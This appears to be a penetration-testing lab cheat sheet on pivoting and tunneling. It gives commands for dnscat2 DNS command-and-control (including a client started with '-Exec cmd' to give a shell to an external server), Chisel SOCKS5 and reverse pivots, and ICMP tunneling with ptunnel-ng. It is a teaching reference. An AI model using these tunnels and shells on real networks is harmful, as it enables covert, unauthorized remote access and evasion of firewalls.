## DNS Tunneling with Dnscat2

Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted Command-&-Control (C&C or C2) channel and sends data inside TXT records within the DNS protocol. 

### Using dnscat2

```bash
## Installing dnscat2
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

## Starting dnscat2 server
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server. 

```powershell
## Installing dnscat2-powershell
git clone https://github.com/lukebaggett/dnscat2-powershell.git

## Importing dnscat2.ps1
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

## SOCKS5 Tunneling with Chisel

Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment. 

### Using Chisel

Remember to edit proxychains.conf to include i.e. `socks5 127.0.0.1 1080`

```bash
## Installing Chisel
git clone https://github.com/jpillora/chisel.git
cd chisel
go build

## Transferring Chisel to Pivot Host
scp chisel ubuntu@10.129.202.64:~/

## Run Chisel Server on Pivot Host
./chisel server -v -p 1234 --socks5

## Connect to Chisel Server
./chisel client -v 10.129.202.64:1234 socks
```

### Chisel Reverse Pivot

There may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.

```bash
## Run Chisel Server on Attack Host
sudo ./chisel server --reverse -v -p 1234 --socks5

## Connecting Chisel Client to Attack Host
./chisel client -v 10.10.14.17:1234 R:socks
```

## ICMP Tunneling with SOCKS

ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network. 

## Using ptunnel-ng

```bash
## Installing ptunnel-ng
git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh 

## Transfer Ptunnel-ng to Pivot Host
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Start ptunnel-ng server on Target Host
# -r should be the IP we want ptunnel-ng to accept connections on
sudo ./ptunnel-ng -r10.129.202.64 -R22  

## Connect to ptunnel-ng server from Attack Host
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

## Tunnel SSH connection through ICMP tunnel
ssh -p2222 -lubuntu 127.0.0.1

## Enable dynamic port forwarding over ssh
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```